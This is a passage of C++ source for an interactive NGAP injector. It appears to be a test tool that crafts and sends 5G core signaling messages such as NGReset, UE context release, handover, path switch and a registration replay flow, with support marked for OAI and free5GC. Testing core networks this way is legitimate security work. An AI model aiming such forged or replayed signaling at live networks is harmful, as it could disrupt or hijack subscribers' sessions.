  id.gnb_id.set_gnb_id().from_number(gnb_id, default_gnb_id_bit_len);
  return id;
}

static user_location_info_c build_user_location_info(const std::string& plmn, const std::string& tac)
{
  user_location_info_c info;
  auto&                nr = info.set_user_location_info_nr();
  nr.nr_cgi.plmn_id.from_string(plmn);
  nr.nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  nr.tai.plmn_id.from_string(plmn);
  nr.tai.tac.from_string(tac);
  return info;
}

static std::string ipv4_to_bit_string(const std::string& address)
{
  in_addr addr = {};
  if (::inet_pton(AF_INET, address.c_str(), &addr) != 1) {
    throw std::runtime_error("Invalid IPv4 transport layer address");
  }

  std::string bits;
  bits.reserve(32);
  const auto* bytes = reinterpret_cast<const uint8_t*>(&addr.s_addr);
  for (unsigned i = 0; i != 4; ++i) {
    for (int bit = 7; bit >= 0; --bit) {
      bits.push_back((bytes[i] & (1U << bit)) != 0 ? '1' : '0');
    }
  }
  return bits;
}

static up_transport_layer_info_c build_gtp_tunnel(const std::string& address, uint32_t teid)
{
  up_transport_layer_info_c info;
  auto&                     tunnel = info.set_gtp_tunnel();
  tunnel.transport_layer_address.from_string(ipv4_to_bit_string(address));
  tunnel.gtp_teid.from_number(teid);
  return info;
}

static void print_confirmation(const std::string& message_name, const std::vector<std::pair<std::string, std::string>>& fields)
{
  std::printf("NGAP injector: preparing %s with parameters:\n", message_name.c_str());
  for (const auto& field : fields) {
    std::printf("  %s=%s\n", field.first.c_str(), field.second.c_str());
  }
}

[[maybe_unused]] static std::optional<ue_ngap_ids> read_ue_ngap_ids()
{
  while (true) {
    std::string line;
    if (!read_line("Enter AMF-UE-NGAP-ID and RAN-UE-NGAP-ID, or q to quit: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);

    if (is_quit_command(line)) {
      return std::nullopt;
    }

    std::stringstream input(line);
    std::string       amf_token;
    std::string       ran_token;
    std::string       extra_token;
    if (!(input >> amf_token >> ran_token) || (input >> extra_token)) {
      std::printf("Expected exactly two IDs, for example: 1 1 or 0x1 0x1\n");
      continue;
    }

    ue_ngap_ids ids = {};
    if (!parse_uint64(amf_token, ids.amf_ue_ngap_id) || ids.amf_ue_ngap_id > max_amf_ue_ngap_id) {
      std::printf("Invalid AMF-UE-NGAP-ID. Valid range is 0..%llu\n",
                  static_cast<unsigned long long>(max_amf_ue_ngap_id));
      continue;
    }
    if (!parse_uint64(ran_token, ids.ran_ue_ngap_id) || ids.ran_ue_ngap_id > max_ran_ue_ngap_id) {
      std::printf("Invalid RAN-UE-NGAP-ID. Valid range is 0..%llu\n",
                  static_cast<unsigned long long>(max_ran_ue_ngap_id));
      continue;
    }

    return ids;
  }
}

static std::optional<ue_message_type> read_ue_message_type()
{
  while (true) {
    std::printf("\nSelect NGAP packet to inject:\n");
    const auto print_menu_entry = [](unsigned number, const char* name, const char* color, const char* scope) {
      std::printf("  %2u) %s%s%s\033[0m\n", number, color, name, scope);
    };
    struct menu_entry {
      const char* name;
      const char* color;
      const char* scope;
    };
    static const menu_entry menu[] = {
        {"NGSetupRequest", "\033[1;32m", ""}, {"NGReset", "\033[1;32m", ""},
        {"NGResetAcknowledge", "\033[1;33m", " (free5GC)"}, {"RANConfigurationUpdate", "\033[1;32m", ""},
        {"AMFConfigurationUpdateAcknowledge", "\033[1;33m", " (OAIᵀ, free5GC)"}, {"AMFConfigurationUpdateFailure", "\033[1;33m", " (OAIᵀ, free5GC)"},
        {"ErrorIndication (non-UE-associated)", "\033[1;32m", ""}, {"ConnectionEstablishmentIndication", "\033[1;31m", ""},
        {"InitialUEMessage", "\033[1;32m", ""}, {"UplinkNASTransport", "\033[1;32m", ""},
        {"NASNonDeliveryIndication", "\033[1;33m", " (OAIᵀ, free5GC)"}, {"InitialContextSetupResponse", "\033[1;32m", ""},
        {"InitialContextSetupFailure", "\033[1;32m", ""}, {"UEContextReleaseRequest", "\033[1;32m", ""},
        {"UEContextReleaseComplete", "\033[1;32m", ""}, {"UEContextModificationResponse", "\033[1;32m", ""},
        {"UEContextModificationFailure", "\033[1;32m", ""}, {"RRCInactiveTransitionReport", "\033[1;33m", " (OAIᵀ, free5GC)"},
        {"UEContextSuspendRequest", "\033[1;31m", ""}, {"UEContextResumeRequest", "\033[1;31m", ""},
        {"UEContextSuspendResponse", "\033[1;31m", ""}, {"UEContextResumeResponse", "\033[1;31m", ""},
        {"RANCPRelocationIndication", "\033[1;31m", ""}, {"ErrorIndication (UE-associated)", "\033[1;32m", ""},
        {"RerouteNASRequest", "\033[1;33m", " (OAIᵀ, free5GCᵀ)"}, {"UEInformationTransfer", "\033[1;31m", ""},
        {"PDUSessionResourceSetupResponse", "\033[1;32m", ""}, {"PDUSessionResourceModifyResponse", "\033[1;32m", ""},
        {"PDUSessionResourceModifyIndication", "\033[1;32m", ""}, {"PDUSessionResourceNotify", "\033[1;32m", ""},
        {"PDUSessionResourceReleaseResponse", "\033[1;32m", ""},
        {"BroadcastSessionModificationResponse", "\033[1;31m", ""}, {"BroadcastSessionReleaseResponse", "\033[1;31m", ""},
        {"BroadcastSessionSetupResponse", "\033[1;31m", ""}, {"BroadcastSessionTransportResponse", "\033[1;31m", ""},
        {"DistributionSetupResponse", "\033[1;31m", ""}, {"DistributionReleaseResponse", "\033[1;31m", ""},
        {"MulticastSessionActivationResponse", "\033[1;31m", ""}, {"MulticastSessionDeactivationResponse", "\033[1;31m", ""},
        {"MulticastSessionUpdateResponse", "\033[1;31m", ""}, {"TimingSynchronisationStatusResponse", "\033[1;31m", ""},
        {"HandoverRequired", "\033[1;32m", ""}, {"HandoverRequestAcknowledge", "\033[1;32m", ""},
        {"HandoverFailure", "\033[1;32m", ""}, {"HandoverNotify", "\033[1;32m", ""},
        {"HandoverCancel", "\033[1;32m", ""}, {"HandoverSuccess", "\033[1;31m", ""},
        {"PathSwitchRequest", "\033[1;32m", ""}, {"UplinkRANStatusTransfer", "\033[1;32m", ""},
        {"UplinkRANEarlyStatusTransfer", "\033[1;31m", ""}, {"UplinkRANConfigurationTransfer", "\033[1;32m", ""},
        {"UplinkRIMInformationTransfer", "\033[1;31m", ""}, {"UERadioCapabilityInfoIndication", "\033[1;32m", ""},
        {"UERadioCapabilityCheckResponse", "\033[1;33m", " (OAIᵀ, free5GC)"}, {"UERadioCapabilityIDMappingResponse", "\033[1;31m", ""},
        {"LocationReport", "\033[1;33m", " (OAIᵀ, free5GC)"}, {"LocationReportingFailureIndication", "\033[1;33m", " (OAIᵀ, free5GC)"},
        {"TraceFailureIndication", "\033[1;33m", " (OAIᵀ, free5GC)"}, {"CellTrafficTrace", "\033[1;33m", " (OAIᵀ, free5GC)"},
        {"SecondaryRATDataUsageReport", "\033[1;33m", " (OAIᵀ, free5GC)"},
        {"UplinkNonUEAssociatedNRPPaTransport", "\033[1;33m", " (OAI, free5GC)"}, {"UplinkUEAssociatedNRPPaTransport", "\033[1;33m", " (OAI, free5GC)"},
        {"UETNLABindingReleaseRequest", "\033[1;33m", " (OAIᵀ, free5GCᵀ)"}, {"RANPagingRequest", "\033[1;31m", ""},
        {"TimingSynchronisationStatusReport", "\033[1;31m", ""}, {"WriteReplaceWarningResponse", "\033[1;33m", " (free5GCᵀ)"},
        {"PWSFailureIndication", "\033[1;33m", " (OAIᵀ, free5GCᵀ)"}, {"PWSRestartIndication", "\033[1;33m", " (OAIᵀ, free5GCᵀ)"},
        {"DuplicateRegistrationReplayFlow", "\033[1;37m", " (injector-only)"}};
    for (unsigned i = 0; i < sizeof(menu) / sizeof(menu[0]); ++i) {
      print_menu_entry(i + 1, menu[i].name, menu[i].color, menu[i].scope);
    }
    std::printf("  q) quit\n");
    std::printf("  Legend: \033[1;32mgreen\033[0m=all three; \033[1;33myellow\033[0m=one/two; ᵀ=TODO-only support\033[1;31mred\033[0m=none\n");

    std::string line;
    if (!read_line("Selection: ", line)) return std::nullopt;
    line = trim_copy(line);
    if (is_quit_command(line)) return std::nullopt;
    uint64_t selection = 0;
    if (!parse_uint64(line, selection) || selection < 1 || selection > 69) {
      std::printf("Invalid selection. Enter 1..69 or q.\n");
      continue;
    }
    static const ue_message_type types[] = {
        ue_message_type::ng_setup_request, ue_message_type::ng_reset, ue_message_type::ng_reset_acknowledge,
        ue_message_type::ran_configuration_update, ue_message_type::amf_configuration_update_acknowledge,
        ue_message_type::amf_configuration_update_failure, ue_message_type::non_ue_error_indication,
        ue_message_type::connection_establishment_indication, ue_message_type::initial_ue_message,
        ue_message_type::uplink_nas_transport, ue_message_type::nas_non_delivery_indication,
        ue_message_type::initial_context_setup_response, ue_message_type::initial_context_setup_failure,
        ue_message_type::ue_context_release_request, ue_message_type::ue_context_release_complete,
        ue_message_type::ue_context_modification_response, ue_message_type::ue_context_modification_failure,
        ue_message_type::rrc_inactive_transition_report, ue_message_type::ue_context_suspend_request,
        ue_message_type::ue_context_resume_request, ue_message_type::ue_context_suspend_response,
        ue_message_type::ue_context_resume_response, ue_message_type::ran_cp_relocation_indication,
        ue_message_type::ue_error_indication, ue_message_type::reroute_nas_request,
        ue_message_type::ue_information_transfer, ue_message_type::pdu_session_resource_setup_response,
        ue_message_type::pdu_session_resource_modify_response, ue_message_type::pdu_session_resource_modify_indication,
        ue_message_type::pdu_session_resource_notify, ue_message_type::pdu_session_resource_release_response,
        ue_message_type::broadcast_session_modification_response, ue_message_type::broadcast_session_release_response,
        ue_message_type::broadcast_session_setup_response, ue_message_type::broadcast_session_transport_response,
        ue_message_type::distribution_setup_response, ue_message_type::distribution_release_response,
        ue_message_type::multicast_session_activation_response, ue_message_type::multicast_session_deactivation_response,
        ue_message_type::multicast_session_update_response, ue_message_type::timing_synchronisation_status_response,
        ue_message_type::handover_required, ue_message_type::handover_request_acknowledge, ue_message_type::handover_failure,
        ue_message_type::handover_notify, ue_message_type::handover_cancel, ue_message_type::handover_success,
        ue_message_type::path_switch_request, ue_message_type::uplink_ran_status_transfer,
        ue_message_type::uplink_ran_early_status_transfer, ue_message_type::uplink_ran_configuration_transfer,
        ue_message_type::uplink_rim_information_transfer, ue_message_type::ue_radio_capability_info_indication,
        ue_message_type::ue_radio_capability_check_response, ue_message_type::ue_radio_capability_id_mapping_response,
        ue_message_type::location_report, ue_message_type::location_reporting_failure_indication,
        ue_message_type::trace_failure_indication, ue_message_type::cell_traffic_trace,
        ue_message_type::secondary_rat_data_usage_report, ue_message_type::uplink_non_ue_associated_nrppa_transport,
        ue_message_type::uplink_ue_associated_nrppa_transport, ue_message_type::ue_tnla_binding_release_request,
        ue_message_type::ran_paging_request, ue_message_type::timing_synchronisation_status_report,
        ue_message_type::write_replace_warning_response, ue_message_type::pws_failure_indication,
        ue_message_type::pws_restart_indication, ue_message_type::duplicate_registration_replay_flow};
    return types[selection - 1];
  }
}

struct error_indication_request {
  bool        include_amf_ue_ngap_id = false;
  bool        include_ran_ue_ngap_id = false;
  uint64_t    amf_ue_ngap_id         = 0;
  uint64_t    ran_ue_ngap_id         = 0;
  bool        include_cause          = true;
  std::string cause                  = "release-due-to-ngran-generated-reason";
  bool        crit_diagnostics       = false;
  std::string variant;
};

static std::optional<error_indication_request> read_error_indication_request(bool ue_associated)
{
  while (true) {
    std::printf("\nSelect ErrorIndication variant [default=1]:\n");
    if (ue_associated) {
      std::printf("  1) UE-associated: AMF UE ID + RAN UE ID + cause\n");
      std::printf("  2) UE-associated: AMF UE ID only + cause\n");
      std::printf("  3) UE-associated: RAN UE ID only + cause\n");
    } else {
      std::printf("  1) Non-UE-associated: cause only\n");
      std::printf("  2) Non-UE-associated: cause + criticality diagnostics\n");
      std::printf("  3) Non-UE-associated: criticality diagnostics only\n");
    }
    std::printf("  q) quit\n");

    std::string line;
    if (!read_line("ErrorIndication selection: ", line)) {
      return std::nullopt;
    }
    line = trim_copy(line);
    if (line.empty()) {
      line = "1";
    }
    if (is_quit_command(line)) {
      return std::nullopt;
    }

    uint64_t selection = 0;
    if (!parse_uint64(line, selection) || selection < 1 || selection > 3) {
      std::printf("Invalid ErrorIndication variant. Enter 1..3 or q.\n");
      continue;
    }

    error_indication_request req = {};
    req.variant = line;
    if (ue_associated) {
      if (selection == 1 || selection == 2) {
        req.include_amf_ue_ngap_id = true;
        req.amf_ue_ngap_id = read_uint64_or_default("AMF UE NGAP ID", 1, max_amf_ue_ngap_id);
      }
      if (selection == 1 || selection == 3) {
        req.include_ran_ue_ngap_id = true;
        req.ran_ue_ngap_id = read_uint64_or_default("RAN UE NGAP ID", 100, max_ran_ue_ngap_id);
      }
      req.include_cause = true;
      auto cause = read_error_indication_cause(true);
      if (!cause.has_value()) {
        return std::nullopt;
      }
      req.cause = cause.value();
    } else {
      req.include_cause = selection != 3;
      if (req.include_cause) {
        auto cause = read_error_indication_cause(false);
        if (!cause.has_value()) {
          return std::nullopt;
        }
        req.cause = cause.value();
      }
      req.crit_diagnostics = selection == 2 || selection == 3;
    }
    return req;
  }
}

static std::optional<std::vector<injectable_ngap_pdu>> read_injectable_ngap_pdus()
{
  const auto message_type = read_ue_message_type();
  if (!message_type.has_value()) {
    return std::nullopt;
  }

  const auto read_amf_id = []() { return read_uint64_or_default("AMF UE NGAP ID", 1, max_amf_ue_ngap_id); };
  const auto read_ran_id = []() { return read_uint64_or_default("RAN UE NGAP ID", 100, max_ran_ue_ngap_id); };
  const auto single      = [](injectable_ngap_pdu pdu) {
    std::vector<injectable_ngap_pdu> pdus;
    pdus.push_back(std::move(pdu));
    return pdus;
  };

  switch (message_type.value()) {
    case ue_message_type::ng_setup_request: {
      print_confirmation("NGSetupRequest", {{"gNB-ID", default_to_string(current_gnb_id)},
                                             {"gNB-ID-Bit-Length", default_to_string(static_cast<unsigned>(default_gnb_id_bit_len))},
                                             {"Sector-ID", default_to_string(static_cast<unsigned>(default_sector_id))},
                                             {"RAN-Node-Name", current_ran_node_name}});
      return single(injectable_ngap_pdu{build_ng_setup_request(), "NGSetupRequest"});
    }
    case ue_message_type::ue_context_release_request: {
      const uint64_t amf_id = read_amf_id();
      const uint64_t ran_id = read_ran_id();
      const auto     cause  = read_ue_context_release_cause();
      if (!cause.has_value()) {
        return std::nullopt;
      }
      print_confirmation("UEContextReleaseRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                      {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                      {"Cause", get_radio_network_cause_label(cause.value())}});
      return single(injectable_ngap_pdu{build_ue_context_release_request(amf_id, ran_id, cause.value()),
                                 "UEContextReleaseRequest"});
    }
    case ue_message_type::uplink_nas_transport: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      print_confirmation("UplinkNASTransport", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                 {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                 {"NAS-PDU", nas_hex}});
      return single(injectable_ngap_pdu{build_uplink_nas_transport(amf_id, ran_id, make_hex_byte_buffer_or_throw(nas_hex)),
                                 "UplinkNASTransport"});
    }
    case ue_message_type::pdu_session_resource_release_response: {
      const uint64_t amf_id         = read_amf_id();
      const uint64_t ran_id         = read_ran_id();
      const auto     pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      print_confirmation("PDUSessionResourceReleaseResponse", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                                {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                                {"PDU-Session-ID", default_to_string(pdu_session_id)}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_release_response(amf_id, ran_id, pdu_session_id),
                                 "PDUSessionResourceReleaseResponse"});
    }
    case ue_message_type::ng_reset: {
      const uint32_t original_gnb_id        = current_gnb_id;
      const std::string original_node_name  = current_ran_node_name;
      current_gnb_id = static_cast<uint32_t>(read_uint64_or_default("NGReset gNB ID", current_gnb_id, max_default_gnb_id));
      current_ran_node_name = read_text_token_or_default("NGReset RAN node name", current_ran_node_name);

      const bool reset_all = get_input_or_default<bool>("Reset Type NG Interface Reset", true);
      std::vector<ue_ngap_ids> ue_ids;
      std::vector<std::pair<std::string, std::string>> fields = {
          {"gNB-ID", default_to_string(current_gnb_id)},
          {"RAN-Node-Name", current_ran_node_name},
          {"Reset-Type", reset_all ? "NG Interface Reset" : "Part of NG Interface"},
          {"Cause", "radio-connection-with-ue-lost"}};

      if (!reset_all) {
        const auto ue_count = read_uint64_or_default("UE list entry count", 1, 256);
        fields.emplace_back("UE-List-Entry-Count", default_to_string(ue_count));
        for (uint64_t i = 0; i != ue_count; ++i) {
          const std::string suffix = ue_count == 1 ? "" : " #" + default_to_string(i + 1);
          const uint64_t amf_id = read_uint64_or_default("AMF UE NGAP ID" + suffix, 1 + i, max_amf_ue_ngap_id);
          const uint64_t ran_id = read_uint64_or_default("RAN UE NGAP ID" + suffix, 100 + i, max_ran_ue_ngap_id);
          ue_ids.push_back({amf_id, ran_id});
          fields.emplace_back("AMF-UE-NGAP-ID" + suffix, default_to_string(amf_id));
          fields.emplace_back("RAN-UE-NGAP-ID" + suffix, default_to_string(ran_id));
        }
      }

      print_confirmation("NGReset", fields);
      auto pdu = injectable_ngap_pdu{build_ng_reset(reset_all, ue_ids), "NGReset"};
      current_gnb_id = original_gnb_id;
      current_ran_node_name = original_node_name;
      return single(std::move(pdu));
    }
    case ue_message_type::ng_reset_acknowledge: {
      const bool include_ue_list = get_input_or_default<bool>("Include UE-associated logical NG connection list", false);
      std::vector<ue_ngap_ids> ue_ids;
      std::vector<std::pair<std::string, std::string>> fields = {{"UE-List-Included", include_ue_list ? "Y" : "N"}};
      if (include_ue_list) {
        const auto ue_count = read_uint64_or_default("UE list entry count", 1, 256);
        fields.emplace_back("UE-List-Entry-Count", default_to_string(ue_count));
        for (uint64_t i = 0; i != ue_count; ++i) {
          const std::string suffix = ue_count == 1 ? "" : " #" + default_to_string(i + 1);
          const uint64_t amf_id = read_uint64_or_default("AMF UE NGAP ID" + suffix, 1 + i, max_amf_ue_ngap_id);
          const uint64_t ran_id = read_uint64_or_default("RAN UE NGAP ID" + suffix, 100 + i, max_ran_ue_ngap_id);
          ue_ids.push_back({amf_id, ran_id});
          fields.emplace_back("AMF-UE-NGAP-ID" + suffix, default_to_string(amf_id));
          fields.emplace_back("RAN-UE-NGAP-ID" + suffix, default_to_string(ran_id));
        }
      }
      print_confirmation("NGResetAcknowledge", fields);
      return single(injectable_ngap_pdu{build_ng_reset_acknowledge(ue_ids), "NGResetAcknowledge"});
    }
    case ue_message_type::ran_configuration_update: {
      const auto        gnb_id = static_cast<uint32_t>(read_uint64_or_default("Global gNB ID", current_gnb_id, max_default_gnb_id));
      const std::string plmn   = read_plmn_or_default("PLMN", "00f110");
      const std::string tac    = read_tac_or_default("TAC", "000007");
      const auto        sst    = static_cast<uint8_t>(read_uint64_or_default("S-NSSAI SST", 1, 255));
      const std::string sd     = read_sd_or_default("S-NSSAI SD", "");
      const bool        include_tnl_removal =
          get_input_or_default<bool>("Include NGRAN-TNL association removal", false);
      std::string ngran_tnl_address;
      bool        include_amf_tnl_address = false;
      std::string amf_tnl_address;
      if (include_tnl_removal) {
        ngran_tnl_address = read_ipv4_or_default("NGRAN TNL endpoint IPv4 address", "127.0.0.1");
        include_amf_tnl_address =
            get_input_or_default<bool>("Include AMF TNL endpoint address", false);
        if (include_amf_tnl_address) {
          amf_tnl_address = read_ipv4_or_default("AMF TNL endpoint IPv4 address", "127.0.0.1");
        }
      }
      print_confirmation("RANConfigurationUpdate", {{"Global-gNB-ID", default_to_string(gnb_id)},
                                                      {"PLMN", plmn},
                                                      {"TAC", tac},
                                                      {"SST", default_to_string(static_cast<unsigned>(sst))},
                                                      {"SD", sd},
                                                      {"TNL-removal", include_tnl_removal ? "Y" : "N"},
                                                      {"NGRAN-TNL-address", ngran_tnl_address},
                                                      {"AMF-TNL-address", amf_tnl_address}});
      return single(injectable_ngap_pdu{build_ran_configuration_update(gnb_id,
                                                                        plmn,
                                                                        tac,
                                                                        sst,
                                                                        sd,
                                                                        include_tnl_removal,
                                                                        ngran_tnl_address,
                                                                        include_amf_tnl_address,
                                                                        amf_tnl_address),
                                         "RANConfigurationUpdate"});
    }
    case ue_message_type::amf_configuration_update_acknowledge: {
      print_confirmation("AMFConfigurationUpdateAcknowledge", {{"Optional-IEs", "none"}});
      return single(injectable_ngap_pdu{build_amf_configuration_update_acknowledge(),
                                         "AMFConfigurationUpdateAcknowledge"});
    }
    case ue_message_type::amf_configuration_update_failure: {
      const std::string cause = get_input_or_default<std::string>("Cause", "release-due-to-ngran-generated-reason");
      print_confirmation("AMFConfigurationUpdateFailure", {{"Cause", cause}});
      return single(injectable_ngap_pdu{build_amf_configuration_update_failure(cause),
                                         "AMFConfigurationUpdateFailure"});
    }
    case ue_message_type::non_ue_error_indication: {
      const auto req = read_error_indication_request(false);
      if (!req.has_value()) {
        return std::nullopt;
      }
      std::vector<std::pair<std::string, std::string>> fields = {{"Variant", req->variant},
                                                                 {"AMF-UE-NGAP-ID-Present", req->include_amf_ue_ngap_id ? "Y" : "N"},
                                                                 {"RAN-UE-NGAP-ID-Present", req->include_ran_ue_ngap_id ? "Y" : "N"},
                                                                 {"Cause-Present", req->include_cause ? "Y" : "N"},
                                                                 {"CriticalityDiagnostics", req->crit_diagnostics ? "Y" : "N"}};
      if (req->include_amf_ue_ngap_id) {
        fields.emplace_back("AMF-UE-NGAP-ID", default_to_string(req->amf_ue_ngap_id));
      }
      if (req->include_ran_ue_ngap_id) {
        fields.emplace_back("RAN-UE-NGAP-ID", default_to_string(req->ran_ue_ngap_id));
      }
      if (req->include_cause) {
        fields.emplace_back("Cause", req->cause);
      }
      print_confirmation("ErrorIndication", fields);
      return single(injectable_ngap_pdu{build_error_indication(req->include_amf_ue_ngap_id,
                                                               req->amf_ue_ngap_id,
                                                               req->include_ran_ue_ngap_id,
                                                               req->ran_ue_ngap_id,
                                                               req->include_cause,
                                                               req->cause,
                                                               req->crit_diagnostics),
                                         "ErrorIndication"});
    }
    case ue_message_type::ue_error_indication: {
      const auto req = read_error_indication_request(true);
      if (!req.has_value()) {
        return std::nullopt;
      }
      std::vector<std::pair<std::string, std::string>> fields = {{"Variant", req->variant},
                                                                 {"AMF-UE-NGAP-ID-Present", req->include_amf_ue_ngap_id ? "Y" : "N"},
                                                                 {"RAN-UE-NGAP-ID-Present", req->include_ran_ue_ngap_id ? "Y" : "N"},
                                                                 {"Cause-Present", req->include_cause ? "Y" : "N"},
                                                                 {"CriticalityDiagnostics", req->crit_diagnostics ? "Y" : "N"}};
      if (req->include_amf_ue_ngap_id) {
        fields.emplace_back("AMF-UE-NGAP-ID", default_to_string(req->amf_ue_ngap_id));
      }
      if (req->include_ran_ue_ngap_id) {
        fields.emplace_back("RAN-UE-NGAP-ID", default_to_string(req->ran_ue_ngap_id));
      }
      if (req->include_cause) {
        fields.emplace_back("Cause", req->cause);
      }
      print_confirmation("ErrorIndication", fields);
      return single(injectable_ngap_pdu{build_error_indication(req->include_amf_ue_ngap_id,
                                                               req->amf_ue_ngap_id,
                                                               req->include_ran_ue_ngap_id,
                                                               req->ran_ue_ngap_id,
                                                               req->include_cause,
                                                               req->cause,
                                                               req->crit_diagnostics),
                                         "ErrorIndication"});
    }
    case ue_message_type::nas_non_delivery_indication: {
      const uint64_t    amf_id  = read_amf_id();
      const uint64_t    ran_id  = read_ran_id();
      const std::string cause   = get_input_or_default<std::string>("Cause", "release-due-to-ngran-generated-reason");
      const std::string nas_hex = read_valid_hex_or_default("NAS PDU hex", "00");
      print_confirmation("NASNonDeliveryIndication", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"Cause", cause},
                                                       {"NAS-PDU", nas_hex}});
      return single(injectable_ngap_pdu{build_nas_non_delivery_indication(amf_id, ran_id, cause, make_hex_byte_buffer_or_throw(nas_hex)),
                                 "NASNonDeliveryIndication"});
    }
    case ue_message_type::pdu_session_resource_notify: {
      const uint64_t amf_id         = read_amf_id();
      const uint64_t ran_id         = read_ran_id();
      const auto     pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto     qfi            = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string cause       = get_input_or_default<std::string>("Cause", "unknown-pdu-session-id");
      print_confirmation("PDUSessionResourceNotify", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                       {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                       {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                                       {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                       {"Cause", cause}});
      return single(injectable_ngap_pdu{build_pdu_session_resource_notify(amf_id, ran_id, pdu_session_id, qfi, cause),
                                 "PDUSessionResourceNotify"});
    }
    case ue_message_type::handover_required: {
      const uint64_t    amf_id      = read_amf_id();
      const uint64_t    ran_id      = read_ran_id();
      const std::string cause       = get_input_or_default<std::string>("Cause", "handover-desirable-for-radio-reason");
      const auto        default_target_gnb = current_gnb_id < max_default_gnb_id ? current_gnb_id + 1 : current_gnb_id;
      const auto        target_gnb         = static_cast<uint32_t>(read_uint64_or_default("Target gNB ID", default_target_gnb, max_default_gnb_id));
      const std::string ho_type        = get_input_or_default<std::string>("Handover Type", "intra5gs");
      const std::string plmn           = read_plmn_or_default("Target PLMN", "00f110");
      const std::string tac            = read_tac_or_default("Target TAC", "000007");
      const auto        pdu_session_id = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        qfi            = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      byte_buffer       rrc_container  = read_handover_rrc_container_or_default();
      print_confirmation("HandoverRequired", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                               {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                               {"Cause", cause},
                                               {"Target-gNB-ID", default_to_string(target_gnb)},
                                               {"Handover-Type", ho_type},
                                               {"Target-PLMN", plmn},
                                               {"Target-TAC", tac},
                                               {"PDU-Session-ID", default_to_string(pdu_session_id)},
                                               {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                               {"RRC-HO-Prep-Container-Octets", default_to_string(rrc_container.length())}});
      return single(injectable_ngap_pdu{
          build_handover_required(amf_id, ran_id, cause, target_gnb, ho_type, plmn, tac, pdu_session_id, qfi, std::move(rrc_container)),
          "HandoverRequired"});
    }
    case ue_message_type::handover_request_acknowledge: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const auto        psi    = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid   = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr   = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi    = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string rrc_container_hex = read_valid_hex_or_default("RRC handover command container hex", default_rrc_handover_command_container_hex);
      print_confirmation("HandoverRequestAcknowledge", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                          {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                                          {"PDU-Session-ID", default_to_string(psi)},
                                                          {"TEID", default_to_string(teid)},
                                                          {"TransportLayerAddress", addr},
                                                          {"QFI", default_to_string(static_cast<unsigned>(qfi))},
                                                          {"RRC-HandoverCommand-Container", rrc_container_hex}});
      return single(injectable_ngap_pdu{build_handover_request_acknowledge(
                                             amf_id,
                                             ran_id,
                                             psi,
                                             teid,
                                             addr,
                                             qfi,
                                             build_target_to_source_transparent_container(rrc_container_hex)),
                                         "HandoverRequestAcknowledge"});
    }
    case ue_message_type::handover_failure: {
      const uint64_t    amf_id = read_amf_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "ho-failure-in-target-5gc-ngran-node-or-target-system");
      const std::string container_hex = read_valid_hex_or_default("Target-to-source failure transparent container hex", "");
      print_confirmation("HandoverFailure", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                              {"Cause", cause},
                                              {"TargetToSourceFailureTransparentContainer", container_hex}});
      return single(injectable_ngap_pdu{build_handover_failure(amf_id, cause, make_hex_byte_buffer_or_throw(container_hex)),
                                         "HandoverFailure"});
    }
    case ue_message_type::handover_cancel: {
      const uint64_t    amf_id = read_amf_id();
      const uint64_t    ran_id = read_ran_id();
      const std::string cause  = get_input_or_default<std::string>("Cause", "handover-cancelled");
      print_confirmation("HandoverCancel", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                             {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
                                             {"Cause", cause}});
      return single(injectable_ngap_pdu{build_handover_cancel(amf_id, ran_id, cause), "HandoverCancel"});
    }
    case ue_message_type::path_switch_request: {
      const uint64_t    amf_id   = read_amf_id();
      const uint64_t    ran_id   = read_ran_id();
      const auto        psi      = static_cast<uint16_t>(read_uint64_or_default("PDU Session ID", 1, max_pdu_session_id));
      const auto        teid     = static_cast<uint32_t>(read_uint64_or_default("TEID", 1, 0xffffffffULL));
      const std::string addr     = read_ipv4_or_default("Transport Layer Address", "127.0.0.1");
      const auto        qfi      = static_cast<uint8_t>(read_uint64_or_default("QFI", 1, 63));
      const std::string plmn     = read_plmn_or_default("PLMN", "00f110");
      const std::string tac      = read_tac_or_default("TAC", "000007");
      print_confirmation("PathSwitchRequest", {{"AMF-UE-NGAP-ID", default_to_string(amf_id)},
                                                {"RAN-UE-NGAP-ID", default_to_string(ran_id)},
